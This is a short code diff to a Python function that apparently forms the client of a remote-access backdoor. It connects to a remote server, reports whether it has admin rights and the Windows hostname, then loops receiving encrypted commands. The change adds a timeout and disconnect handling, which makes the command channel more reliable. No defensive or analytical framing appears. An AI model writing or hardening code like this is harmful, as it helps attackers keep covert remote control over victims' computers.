@@ -789,6 +789,7 @@ def connect_to_server(host, port, key):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
+        s.settimeout(60)  # Set timeout to prevent hanging
         
         admin_status = "[ADMIN]" if check_admin() else "[USER]"
         hostname = os.environ.get('COMPUTERNAME', 'Unknown')
@@ -796,7 +797,11 @@ def connect_to_server(host, port, key):
         
         while True:
             try:
-                command = decrypt_data(key, s.recv(8192))
+                data = s.recv(8192)
+                if not data:
+                    break
+                
+                command = decrypt_data(key, data)
                 
                 if not command:
                     break
